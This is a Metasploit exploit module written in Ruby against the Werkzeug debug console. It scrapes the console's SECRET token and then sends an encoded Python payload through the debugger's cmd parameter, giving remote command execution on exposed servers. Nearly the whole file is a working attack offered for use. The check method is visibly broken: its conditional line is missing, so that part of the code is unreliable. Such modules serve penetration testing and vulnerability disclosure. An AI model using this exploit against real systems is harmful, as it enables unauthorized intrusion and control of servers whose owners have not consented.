# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;rex&#039;

class Metasploit4 < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Werkzeug Debug Shell Command Execution&#039;,
      &#039;Description&#039;    => %q{
        This module will exploit the Werkzeug debug console to put down a
        Python shell. This debugger "must never be used on production
        machines" but sometimes slips passed testing.

        Tested against:
          0.9.6 on Debian
          0.9.6 on Centos
          0.10  on Debian
      },
      &#039;Author&#039;         => &#039;h00die <mike[at]shorebreaksecurity.com>&#039;,
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://werkzeug.pocoo.org/docs/0.10/debug/#enabling-the-debugger&#039;]
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => [&#039;python&#039;],
      &#039;Targets&#039;        => [[ &#039;werkzeug 0.10 and older&#039;, {}]],
      &#039;Arch&#039;           => ARCH_PYTHON,
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jun 28 2015&#039;
    ))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;URI to the console&#039;, &#039;/console&#039;])
      ], self.class
    )
  end

  def check
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(datastore[&#039;TARGETURI&#039;])
    )

    # https://github.com/mitsuhiko/werkzeug/blob/cc8c8396ecdbc25bedc1cfdddfe8df2387b72ae3/werkzeug/debug/tbtools.py#L67
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    # first we need to get the SECRET code
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(datastore[&#039;TARGETURI&#039;])
    )

    if res && res.body =~ /SECRET = "([a-zA-Z0-9]{20})";/
      secret = $1
      vprint_status("Secret Code: #{secret}")
      send_request_cgi(
        &#039;method&#039;   => &#039;GET&#039;,
        &#039;uri&#039;      => normalize_uri(datastore[&#039;TARGETURI&#039;]),
        &#039;vars_get&#039; => {
          &#039;__debugger__&#039; => &#039;yes&#039;,
          &#039;cmd&#039;          => payload.encoded,
          &#039;frm&#039;          => &#039;0&#039;,
          &#039;s&#039;            => secret
        }
      )
    else
      print_error(&#039;Secret code not detected.&#039;)
    end
  end

end

